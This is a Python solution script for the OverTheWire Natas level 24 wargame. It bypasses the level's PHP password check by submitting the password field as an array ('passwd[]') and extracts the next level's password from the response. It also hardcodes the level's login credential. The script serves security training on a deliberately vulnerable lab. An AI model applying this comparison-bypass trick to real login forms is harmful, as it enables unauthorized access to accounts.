#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = "http://%s.natas.labs.overthewire.org/" % username


data={"passwd[]":"testing"}

req_post = req.post(url,data=data,auth=(username,password))
# print(req_post.text)

new_password = re.findall("Password: (.*)</pre>",req_post.text)
print(new_password[0])
